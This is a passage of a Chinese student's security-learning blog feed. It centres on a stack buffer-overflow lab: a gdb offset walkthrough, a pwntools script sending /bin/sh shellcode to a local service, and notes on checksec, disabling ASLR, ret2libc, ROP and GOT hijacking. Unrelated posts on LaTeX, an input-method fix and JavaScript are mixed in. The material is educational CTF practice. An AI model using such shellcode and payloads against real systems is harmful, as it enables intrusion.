<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">vunerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>编译的时候关掉了一切保护措施<code>balabala -o level1</code></p>
<p>然后</p>
<ol>
<li>打开gdb<pre class="line-numbers language-bash"><code class="language-bash"> haibin$: gdb ./level1
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>跑一个150长的字符串<pre class="line-numbers language-gdb"><code class="language-gdb"> gdb-peda$ pattern create 150
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>跑一下程序，把字符串输进去，得到崩溃时候的无效返回地址<pre><code> Stopped reason: SIGSEGV
 0x41416d41 in ?? ()
</code></pre></li>
<li>看看这个字符串<code>0x41416d41</code>(<code>AmAA</code>)在输入的哪个位置上(这里开始有疑问，后来明白了)<pre><code> pattern offset 0x41416d41
</code></pre> 或者<pre><code> pattern offset &#39;AmAA&#39;
</code></pre> 不是<pre><code> pattern offset &#39;AAmA&#39;
</code></pre> 哦<br> 因为这里是小端<code>0x41416d41</code>实际上意思是以此出现了<code>0x41</code>, <code>0x6d</code>, <code>0x41</code>, <code>0x41</code> ，从低的地方往高的地方数数哦,所以对应的是字符串<code>AmAA</code></li>
<li>得到了偏移量<pre class="line-numbers language-gdb"><code class="language-gdb"> gdb-peda$ pattern offset '0x41416d41'
 1094806849 found at offset: 140
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>接下来就是通过贮储文件得到正确的要跳转到的shellcode的位置，前面的过程相当于得知了shellcode的格式，即相对位置(shellcode + padding + ret) 其中shellcode和padding共长140，<code>ret</code>处填shellcode的起始位置，即为报错时候的<code>$esp - 140 -4</code>，但这是个相对位置，我们得得到程序运行时候的shellcode的绝对位置，就是栈上的某一块位置，本来的话，我们在调试的时候，出现<code>Stopped reason: SIGSEGV 0x41416d41 in ?? ()</code> 的时候就可以通过<code>x/10s $esp-144</code>就可以看到我们shellcode的地址</p>
<pre class="line-numbers language-gdb"><code class="language-gdb"> gdb-peda$ x/10s $esp-144
 0xffffcb50:    "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377"
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里得到shellcode的地址为<code>0xffffcb50</code>,但实际上有个问题，据说gdb调试的时候会影响栈地址，和不用gdb的时候不一样，我的天，，，所以要正常运行程序生成贮储文件来找出正确的地址</p>
<pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">ulimit</span> -c unlimited
 <span class="token function">sudo</span> sh -c <span class="token string">'echo "tmp/core.%t" > /proc/sys/kernel/core_pattern'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>大概是设置转储文件名字格式<br>之后运行我们的程序，输入长字符串</p>
<pre class="line-numbers language-bash"><code class="language-bash"> haibin$: ./level1
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="token punctuation">..</span><span class="token punctuation">..</span>.懒得帖了
 Segment fault<span class="token punctuation">(</span>core dump<span class="token punctuation">)</span>
 haibin$: gdb level1 /tmp/core.xxxxxxx
 <span class="token punctuation">..</span><span class="token punctuation">..</span>各种信息
 Program terminated with signal SIGSEGV, Segmentation fault.
 \#0  0x41416d41 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
 gdb-peda$ x/10s <span class="token variable">$esp</span>-144
 0xffffcb90:    <span class="token string">"AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>得到了我们要的地址<code>0xffffcb90</code>(这个地址确实和开gdb的不一样，开gdb的地址大概是<code>0xffffcb50</code>)，然后就能写poc了</p>
</li>
<li><p>写poc</p>
</li>
</ol>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token comment" spellcheck="true">#encoding: utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true">#p = process('./level1')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">123456</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> <span class="token number">0xffffcb90</span>   

<span class="token comment" spellcheck="true">#md , shou qiao hao lei a,我从网上抄的shellcode，感觉好像其实不能用</span>
shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x0b\xcd\x80"</span>

payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">140</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 140 + 4 没毛病</span>
<span class="token keyword">print</span> payload

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#|-----------payload---------|</span>
<span class="token comment" spellcheck="true">#|---------------------------|</span>
<span class="token comment" spellcheck="true">#|140 bytes          |4 bytes|</span>
<span class="token comment" spellcheck="true">#|---------------------------|</span>
<span class="token comment" spellcheck="true">#|shellcode + padding|ret    |</span>
<span class="token comment" spellcheck="true">#|---------------------------|</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>写好跑一下，应该就能getshell了，但我好像并没有成功，不知道为什么，但大概了解了整个过程</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[checksec]]></title>
      <url>/2017/04/29/checksec-1/</url>
      <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="???"></a>???</h2><pre class="line-numbers language-bash"><code class="language-bash">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>checksec 一下</p>
<pre><code>[*] &#39;/home/haibin/ctf/pwn/rop/level1&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p><code>-m32</code>是要生成<code>32位</code>程序</p>
<ul>
<li><code>checksec</code>结果里的<code>Arch:     i386-32-little</code> 代表 32位<br><code>-fno-stack-protector</code> 禁用了<code>stack-protector</code> 栈溢出保护机制</li>
<li>看到<code>Stack: Canary xxx</code> ,传说中的<code>Canary</code>金丝雀，如果有的话可以用来防御栈溢出<br><code>-z execstack</code> 开启栈上可执行 </li>
<li>看结果里有 <code>RWX: Has RWX segments</code>而且<code>NX: NX disabled</code></li>
</ul>
<h2 id="直接生成的，不关闭保护措施的"><a href="#直接生成的，不关闭保护措施的" class="headerlink" title="直接生成的，不关闭保护措施的"></a>直接生成的，不关闭保护措施的</h2><pre class="line-numbers language-bash"><code class="language-bash">gcc -m32 -o level1-plus-32 level1.c
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>checksec一下</p>
<pre><code>[*] &#39;/home/haibin/ctf/pwn/rop/level1-plus-32&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p><code>NX/DEP</code> 可以让堆栈标记为不可执行,这里<code>NX enabled</code>了，所以没有发现<code>RWX segment</code><br><code>Canary</code> 金丝雀，堆栈的局部变量和返回地址之间保存的一个随机值(感觉像是Cookie一样)</p>
<h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><pre class="line-numbers language-bash"><code class="language-bash">haibin$: <span class="token function">sudo</span> -s
root\#: <span class="token keyword">echo</span> 0 <span class="token operator">></span> /proc/sys/kernel/randomize_va_space
root\#: <span class="token keyword">exit</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这个和checksec没什么关系， ASLR是系统的功能</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark个qq的API]]></title>
      <url>/2017/04/25/mark%E4%B8%AAqq%E7%9A%84API/</url>
      <content type="html"><![CDATA[<ol>
<li><a href="http://r.pengyou.com/fcg-bin/cgi_get_portrait.fcg?uins=QQ&amp;get_nick=1" target="_blank" rel="external">http://r.pengyou.com/fcg-bin/cgi_get_portrait.fcg?uins=QQ&amp;get_nick=1</a> 获取空间头像，QQ昵称 </li>
<li><a href="http://qlogo1.store.qq.com/qzone/QQ/QQ/100" target="_blank" rel="external">http://qlogo1.store.qq.com/qzone/QQ/QQ/100</a> 获取空间头像</li>
<li><a href="http://q2.qlogo.cn/headimg_dl?dst_uin=QQ&amp;spec=40" target="_blank" rel="external">http://q2.qlogo.cn/headimg_dl?dst_uin=QQ&amp;spec=40</a> 获取qq头像</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> API </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tex 中文问题]]></title>
      <url>/2017/04/25/tex-%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>以前只是排过tex的英文，，还比较友好</p>
<p>试了下中文报了一万个错误，大概找到了一种解决方法</p>
<blockquote>
<p>卸载掉texlive2015</p>
</blockquote>
<p>开玩笑的</p>
<p>是用<code>xeCJK</code>宏包</p>
<pre class="line-numbers language-tex"><code class="language-tex">\documentclass{article}  
\usepackage{xeCJK}
\setCJKmainfont{WenQuanYi Micro Hei}
\begin{document}  
海滨翘了下午的数据挖掘课
\end{document}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里</p>
<pre class="line-numbers language-tex"><code class="language-tex">\setCJKmainfont{WenQuanYi Micro Hei}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以用其他系统装了的支持中文的字体</p>
<pre class="line-numbers language-bash"><code class="language-bash">fc-list :lang<span class="token operator">=</span>zh-cn
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里有个空格的，哥</p>
<p>就酱紫</p>
]]></content>
      
        
        <tags>
            
            <tag> tex </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSP]]></title>
      <url>/2017/04/24/CSP/</url>
      <content type="html"><![CDATA[<p>大佬的CSP全家桶，看到好的再贴过来，把这几篇先看完<br><a href="http://lorexxar.cn/2016/08/08/ccsp/" target="_blank" rel="external">http://lorexxar.cn/2016/08/08/ccsp/</a><br><a href="http://lorexxar.cn/2017/02/16/cdn-bypass-csp/" target="_blank" rel="external">http://lorexxar.cn/2017/02/16/cdn-bypass-csp/</a><br><a href="http://lorexxar.cn/2016/04/20/gif-ccsp/" target="_blank" rel="external">http://lorexxar.cn/2016/04/20/gif-ccsp/</a><br><a href="http://lorexxar.cn/2016/04/08/input-bypasscsrf/" target="_blank" rel="external">http://lorexxar.cn/2016/04/08/input-bypasscsrf/</a></p>
<p>大佬多次提到的<code>&lt;link rel=&quot;prefetch&quot; herf=&quot;xxxxxxx&quot;&gt;</code> mark一下先</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iframe 跨域]]></title>
      <url>/2017/04/24/iframe-%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<p>看了0ctf跨域xss的题目还是没太看懂</p>
<p>看大家纷纷使用iframe跨域。。并不太懂</p>
<p>搜了几篇文章学习一下</p>
<p>iframe xss<br><a href="http://www.cnblogs.com/xiaoheimiaoer/p/4418357.html" target="_blank" rel="external">http://www.cnblogs.com/xiaoheimiaoer/p/4418357.html</a></p>
<p>parent top self<br><a href="http://blog.csdn.net/zdwzzu2006/article/details/6047632" target="_blank" rel="external">http://blog.csdn.net/zdwzzu2006/article/details/6047632</a></p>
<p>js 跨域<br><a href="https://segmentfault.com/a/1190000003642057" target="_blank" rel="external">https://segmentfault.com/a/1190000003642057</a></p>
<p>跨域<br><a href="http://blog.csdn.net/mevicky/article/details/51404610" target="_blank" rel="external">http://blog.csdn.net/mevicky/article/details/51404610</a></p>
<p>windows.open<br><a href="http://www.cnblogs.com/xiaoheimiaoer/p/4734977.html" target="_blank" rel="external">http://www.cnblogs.com/xiaoheimiaoer/p/4734977.html</a></p>
<p>MD, 我好菜啊</p>
<p>Bypass CSP<br><a href="http://lorexxar.cn/2016/10/28/csp-then/" target="_blank" rel="external">http://lorexxar.cn/2016/10/28/csp-then/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> 周一 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sogou 日常不能用]]></title>
      <url>/2017/04/23/sogou-%E6%97%A5%E5%B8%B8%E4%B8%8D%E8%83%BD%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>有的时候啊，这个搜狗输入法，他就莫名只显示当前输入的字母，然后并没有侯选框给你选汉字，太坑了，是不是因为我用<code>Ubuntu 16.04</code>的原因</p>
<a id="more"></a>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ol>
<li>删掉这几个文件夹<pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">rm</span> -rf ~/.config/sogou-qimpanel
 <span class="token function">rm</span> -rf ~/.config/SogouPY
 <span class="token function">rm</span> -rf ~/.config/SogouPY.users
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>重装sogou<ul>
<li>实测可以不需要先卸载，阔以直接装</li>
</ul>
</li>
<li>然后重启<ul>
<li>尚且不知道这次重启是不是必须的</li>
</ul>
</li>
<li>然后就能用了</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[binAry]]></title>
      <url>/2017/04/21/binAry/</url>
      <content type="html"><![CDATA[<h3 id="p32-u32"><a href="#p32-u32" class="headerlink" title="p32 u32"></a>p32 u32</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> struct
<span class="token operator">>></span><span class="token operator">></span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">==</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> u32<span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span> <span class="token operator">==</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'37130000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'\x37\x13\x00\x00'</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> u8<span class="token punctuation">(</span><span class="token string">'\x41'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x41</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> u8<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x41</span>
<span class="token boolean">True</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Notice"><a href="#Notice" class="headerlink" title="Notice:"></a>Notice:</h4><pre><code>u32(&#39;abcd&#39;) =&gt; u32(&#39;\x61\x62\x63\x64&#39;)
</code></pre><pre><code>&#39;A&#39; =&gt; &#39;\x41&#39; =&gt; String
0x41 =&gt; number
</code></pre><p><code>struct.unpack</code> =&gt; <a href="http://blog.csdn.net/gracioushe/article/details/5915900" target="_blank" rel="external">http://blog.csdn.net/gracioushe/article/details/5915900</a><br><code>struct</code> =&gt; <a href="https://docs.python.org/2/library/struct.html" target="_blank" rel="external">https://docs.python.org/2/library/struct.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[能看得懂的CBC攻击]]></title>
      <url>/2017/04/14/%E8%83%BD%E7%9C%8B%E5%BE%97%E6%87%82%E7%9A%84CBC%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p><a href="http://k1n9.me/2017/03/16/attack-in-cbc/" target="_blank" rel="external">http://k1n9.me/2017/03/16/attack-in-cbc/</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[checksec]]></title>
      <url>/2017/04/14/checksec/</url>
      <content type="html"><![CDATA[<p>mark 一下,感觉大家都在用这个<br><a href="http://bestwing.me/2016/12/26/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="external">http://bestwing.me/2016/12/26/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[栈溢出]]></title>
      <url>/2017/04/14/ROP/</url>
      <content type="html"><![CDATA[<h2 id="人家的文章写的就是好"><a href="#人家的文章写的就是好" class="headerlink" title="人家的文章写的就是好"></a>人家的文章写的就是好</h2><p><a href="http://paper.seebug.org/271/" target="_blank" rel="external">http://paper.seebug.org/271/</a><br><a href="http://paper.seebug.org/272/" target="_blank" rel="external">http://paper.seebug.org/272/</a></p>
<h2 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h2><p>内存布局随机化(ASLR): 一个会妨碍我们进行攻击的措施，字面意思</p>
<h2 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h2><pre><code>+++++++++++++++++++++++++ high Add
Return Address                      return to F&#39;s F&#39;s next sentence
------------------------ 0xA
Caller&#39;s Caller&#39;s EBP               F&#39;F
------------------------ 0xB
some state about Caller             F&#39;s data
------------------------ 0xC
Callee&#39;s Arg                        Child&#39;s arg
------------------------ 0xD
Return Address                      return to F&#39;s next sentence
------------------------ 0xE
Caller&#39;s EBP                        *save Callers&#39;s data basis Adddress, is not now EBP(is this Addr)
------------------------ 0xF
Local Var                           Child&#39;s data
++++++++++++++++++++++++ low Add
</code></pre><p>Caller’s EBP 那个地址<code>0xF</code>存的那个数据<code>0xB</code>是Caller的基地址<br>但那个地址正好是<code>0xF</code>正好是Callee的基地址(也许是<code>0xE</code>???)</p>
<h2 id="四种栈溢出利用姿势"><a href="#四种栈溢出利用姿势" class="headerlink" title="四种栈溢出利用姿势"></a>四种<code>栈溢出</code>利用姿势</h2><h3 id="一个注意的点是payload里不要包含0x00，会被截断的"><a href="#一个注意的点是payload里不要包含0x00，会被截断的" class="headerlink" title="一个注意的点是payload里不要包含0x00，会被截断的"></a>一个注意的点是payload里不要包含<code>0x00</code>，会被截断的</h3><ul>
<li><p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</p>
</li>
<li><p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p>
</li>
<li><p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p>
</li>
<li><p>修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p>
</li>
</ul>
<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>payload : padding1 + address of shellcode + padding2 + shellcode<br>padding1: 通常都是可随意填写，调试确定具体长度<br>一般的，可能无法确定padding2的具体大小，所以会填充若干<code>\x90</code><br>padding2: \x90 + \x90 + … , 因为<code>\x90</code>是<code>nop</code><br>前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）</p>
<h3 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h3><p>payload : padding1 + address of system() + padding2 + address of “/bin/sh”<br>padding1: 能随意填写，调试确定呢具体长度<br>padding2: 数据长度为4（32位机），对应调用 system() 时的返回地址。<br>其实不是很理解这个padding2, padding2的这个位置不应该是<code>system</code>函数的第一个参数吗<br>不是应该直接填写<code>/bin/sh</code>吗0.0 不太懂….先跳过吧<br>因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>payload : padding + address of gadget 1 + address of gadget 2 + …… + address of gadget n<br>在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行 gadget 2，以此类推。<br>为了拼凑代码段，以执行一次系统调用，帅气~</p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><p>要复习考试了，暂停中</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Omi-learn]]></title>
      <url>/2017/04/14/Omi-learn/</url>
      <content type="html"><![CDATA[<h2 id="关于Omi"><a href="#关于Omi" class="headerlink" title="关于Omi"></a>关于Omi</h2><p>Omi 是腾讯前端团队…balabala</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> omi-demo
<span class="token function">cd</span> omi-demo
<span class="token function">wget</span> https://unpkg.com/omi@1.3.2/dist/omi.min.js
<span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> -g browser-sync
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>哦，本来其实<code>browser-sync</code>和<code>Gulp</code>一起用的，我没有就不xx了</p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>抄了一个demo <code>index.js</code></p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">import</span> Omi <span class="token keyword">from</span> <span class="token string">'./omi.min.js'</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Hello</span> <span class="token keyword">extends</span> <span class="token class-name">Omi<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    style <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span>  <span class="token template-string"><span class="token string">`
        &lt;style>
            h1{
                cursor:pointer;
            }
        &lt;/style>
         `</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">handleClick</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> evt<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span>  <span class="token template-string"><span class="token string">`
        &lt;div>
            &lt;h1 onclick="handleClick(this, event)">Hello ,{{name}}!&lt;/h1>
        &lt;/div>
        `</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

Omi<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Hello</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name <span class="token punctuation">:</span> <span class="token string">"Omi"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"#container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>好了，跑一下</p>
<pre class="line-numbers language-bash"><code class="language-bash">browser-sync start --server index.js
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后访问下<code>http://localhost:3000/</code></p>
<p>好了，<code>Cannot GET /</code>，失败</p>
]]></content>
      
        
        <tags>
            
            <tag> Omi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[es6学习]]></title>
      <url>/2017/04/14/es6%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>今天又是周五，下周有一门考试，今天上午浪完，下午就去复习<br><a id="more"></a></p>
<blockquote>
<p>所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。</p>
</blockquote>
<h2 id="状态的改变"><a href="#状态的改变" class="headerlink" title="状态的改变"></a>状态的改变</h2><p><code>Pending</code> =&gt; <code>Resolved</code> =&gt; <code>Rejected</code><br>分别是 进行中， 已完成， 失败</p>
<p>## </p>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> es6 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[前端框架安全问题]]></title>
      <url>/2017/04/13/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>待记录</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[ssrf]]></title>
      <url>/2017/04/13/ssrf/</url>
      <content type="html"><![CDATA[<p>先mark</p>
<p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">http://joychou.org/index.php/web/phpssrf.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[gopher]]></title>
      <url>/2017/04/13/gopher/</url>
      <content type="html"><![CDATA[<p>先mark<br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[glibc]]></title>
      <url>/2017/04/13/glibc/</url>
      <content type="html"><![CDATA[<p><a href="http://fanrong1992.github.io/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free" target="_blank" rel="external">http://fanrong1992.github.io/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free</a></p>
]]></content>
